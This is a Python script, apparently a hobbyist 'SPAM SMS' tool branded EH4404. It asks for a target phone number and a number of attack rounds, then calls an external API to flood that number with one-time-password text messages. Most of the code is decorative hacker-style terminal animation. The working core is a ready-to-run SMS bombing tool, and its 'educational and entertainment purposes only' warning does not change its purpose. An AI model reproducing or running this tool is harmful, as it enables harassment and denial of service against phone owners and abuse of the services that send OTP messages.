import requests
import time
import os
import random
import base64
import hashlib
import threading
from functools import reduce
from typing import Dict, Any, Callable
from pystyle import Colors, Colorate
from tqdm import tqdm
from abc import ABC, abstractmethod
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry


class QuantumChaosEngine:
    def __init__(self, seed: str):
        self._entropy_pool = hashlib.sha256(seed.encode()).hexdigest()
        self._quantum_state = int(self._entropy_pool, 16) ^ 0xCAFEBABE
        self._sync_lock = threading.Lock()

    def _evolve_quantum(self) -> None:
        with self._sync_lock:
            self._quantum_state = (self._quantum_state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
            self._quantum_state ^= (self._quantum_state >> 23) ^ (self._quantum_state << 17)

    def generate_entropy(self, length: int) -> str:
        self._evolve_quantum()
        return ''.join(chr((self._quantum_state >> (i % 64)) & 0xFF) for i in range(length))

    def extract_state(self) -> int:
        self._evolve_quantum()
        return self._quantum_state


class AbstractInfiltrationUnit(ABC):
    @abstractmethod
    def deploy(self, vector: Dict[str, Any]) -> None:
        pass


class EH4404UltimateHackerSystem(AbstractInfiltrationUnit):
    def __init__(self):
        self.logo = """
███████╗██╗░░██╗░░██╗██╗░░██╗██╗░█████╗░░░██╗██╗
██╔════╝██║░░██║░██╔╝██║░██╔╝██║██╔══██╗░██╔╝██║
█████╗░░███████║██╔╝░██║██╔╝░██║██║░░██║██╔╝░██║
██╔══╝░░██╔══██║███████║███████║██║░░██║███████║
███████╗██║░░██║╚════██║╚════██║╚█████╔╝╚════██║
╚══════╝╚═╝░░╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░░░░░░╚═╝
        """
        self.BASE_URL = "https://eh4404-api-sms.onrender.com/send-otp/"
        self.API_KEY = "EH4404"
        self._chaos_engine = QuantumChaosEngine(self.API_KEY)
        self._infiltration_threads = []
        self._print_lock = threading.Lock()

    def _safe_print(self, text: str) -> None:
        with self._print_lock:
            print(text)

    def cyber_blast_effect(self, text, blasts=4):
        def _blast_wave(color: Colors, txt: str):
            with self._print_lock:
                print(Colorate.Color(color, f"[{txt}]"), end='\r', flush=True)
                time.sleep(0.1)

        for _ in range(blasts):
            t1 = threading.Thread(target=_blast_wave, args=(Colors.red, text))
            t2 = threading.Thread(target=_blast_wave, args=(Colors.green, text))
            self._infiltration_threads.extend([t1, t2])
            t1.start()
            t1.join()
            t2.start()
            t2.join()
        self._safe_print(Colorate.Color(Colors.purple, f"[{text}]"))

    def terminal_storm(self, lines=25, duration=3):
        chars = "01XSYSTEMHACKQUANTUMNETWORKINFILTRATE"
        terminal_width = os.get_terminal_size().columns
        start_time = time.time()

        def _storm_thread():
            while time.time() - start_time < duration:
                for _ in range(lines):
                    line = ''.join(self._chaos_engine.generate_entropy(1) if random.random() > 0.7 else random.choice(chars)
                                   for _ in range(terminal_width))
                    color = random.choice([Colors.red, Colors.green, Colors.purple])
                    self._safe_print(Colorate.Color(color, line))
                    time.sleep(0.02)

        storm = threading.Thread(target=_storm_thread)
        self._infiltration_threads.append(storm)
        storm.start()
        storm.join()

    def badass_loading_sequence(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        self._safe_print(Colorate.Vertical(Colors.red_to_purple, self.logo))
        self.cyber_blast_effect("SYSTEM INSTALL", 4)
        time.sleep(1)
        self._safe_print(Colorate.Color(Colors.red, "\n[PHASE 1] RELOAD DATA"))
        self.terminal_storm(30, 4)
        self._safe_print(Colorate.Color(Colors.purple, "\n[PHASE 2] SET DATA"))
        self.terminal_storm(35, 2)
        self.cyber_blast_effect("EH4404 COMPLETE", 5)

    def show_main_terminal(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        self._safe_print(Colorate.Vertical(Colors.red_to_green, self.logo))
        self._safe_print(Colorate.Color(Colors.orange, "\n[Warning] For educational and entertainment purposes only."))
        self._safe_print(Colorate.Color(Colors.green, "\n[CREDIT] SPAM SMS FREE By EH4404"))
        self._safe_print(Colorate.Color(Colors.red, "----------------------------------------"))

    def censor_phone_number(self, phone_number):
        if len(phone_number) >= 7:
            return f"{phone_number[:3]}****{phone_number[-4:]}"
        return phone_number

    def send_otp(self, phone_number, rounds):
        censored_phone = self.censor_phone_number(phone_number)
        url = f"{self.BASE_URL}?phone={phone_number}&rounds={rounds}&key={self.API_KEY}"
        self._safe_print(Colorate.Color(Colors.green, f"\n[TARGET] {censored_phone} LOCKED"))
        self._safe_print("")
        self._safe_print(Colorate.Color(Colors.purple, "[API] START..."))
        time.sleep(0.5)

        # ตั้งค่า retry mechanism
        session = requests.Session()
        retry_strategy = Retry(
            total=3,  # ลองใหม่ 3 ครั้ง
            backoff_factor=1,  # หน่วงเวลา 1, 2, 4 วินาที
            status_forcelist=[500, 502, 503, 504]  # retry เฉพาะ error เหล่านี้
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("https://", adapter)

        try:
            response = session.get(url, timeout=30)  # ขยาย timeout เป็น 30 วินาที
            response.raise_for_status()
            result = response.json()

            self._safe_print(Colorate.Color(Colors.green, "[SUCCESS] SEND OTP"))
            self._safe_print("")
            self._safe_print(Colorate.Color(Colors.red, f"[OUTPUT] Status: {result['status']}"))
            self._safe_print(Colorate.Color(Colors.green, f"[OUTPUT] Successful: {result['successful']}"))
            self._safe_print(Colorate.Color(Colors.red, f"[OUTPUT] Failed: {result['failed']}"))
            self._safe_print(Colorate.Color(Colors.purple, f"[OUTPUT] Message: {result['message']}"))
            return result

        except requests.exceptions.Timeout:
            self._safe_print(Colorate.Color(Colors.red, "\n[FAILURE] API TIMEOUT: Server took too long to respond"))
            return None
        except requests.exceptions.ConnectionError:
            self._safe_print(Colorate.Color(Colors.red, "\n[FAILURE] CONNECTION ERROR: Cannot reach the server"))
            return None
        except requests.exceptions.RequestException as e:
            self._safe_print(Colorate.Color(Colors.red, f"\n[FAILURE] SYSTEM ERROR: {e}"))
            return None

    def deploy(self, vector: Dict[str, Any]) -> None:
        self.badass_loading_sequence()
        self.show_main_terminal()

        self._safe_print(Colorate.Color(Colors.red, "\n[INPUT] TARGET PHONE:"))
        phone_number = input(Colorate.Color(Colors.green, ">>> "))
        censored_phone = self.censor_phone_number(phone_number)
        with self._print_lock:
            print(f"\033[1A\033[K", end="")
            print(Colorate.Color(Colors.green, f">>> {censored_phone}"))

        self._safe_print(Colorate.Color(Colors.red, "\n[INPUT] ATTACK ROUNDS:"))
        rounds = input(Colorate.Color(Colors.green, ">>> "))

        if not rounds.isdigit():
            self._safe_print(Colorate.Color(Colors.red, "[ERROR] INVALID ROUNDS DETECTED"))
            return

        self.send_otp(phone_number, rounds)


def initiate_infiltration():
    system = EH4404UltimateHackerSystem()
    system.deploy({})


if __name__ == "__main__":
    threading.Thread(target=initiate_infiltration).start()
